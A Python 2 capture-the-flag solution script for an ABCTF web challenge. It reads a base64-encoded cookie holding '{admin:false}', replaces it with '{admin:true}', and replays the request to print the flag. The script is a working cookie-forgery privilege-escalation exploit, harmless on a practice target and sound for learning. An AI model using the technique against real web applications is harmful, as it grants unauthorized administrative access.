#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-07-17 09:24:20
# @Last Modified by:   john
# @Last Modified time: 2016-07-17 09:55:42

import requests
import re
import base64
import urllib

flag_format = r'ABCTF{.*}'
url = 'http://yrmyzscnvh.abctf.xyz/web3/'

s = requests.Session()

# Grab the cookie
s.get(url)

# After some inspection, we find that:
# The cookie we are interested in is called "coookie"
string = s.cookies["coookie"]
# ... -> e2FkbWluOmZhbHNlfQ%3D%3D


# It is encoded, so we'll clean it up
string = urllib.unquote(string)
# ... -> e2FkbWluOmZhbHNlfQ==


# This is base64 encoded, so we'll decode it
# print base64.b64decode(string)
# .... -> {admin:false}

# We'll just change that value, and put it back to base64...
new_value = base64.b64encode('{admin:true}')

# Set it as the new cookie value (remove the old one first)
s.cookies.pop('coookie')
s.cookies.set('coookie', new_value)


response = s.get(url)
print re.findall(flag_format,response.text)[0]
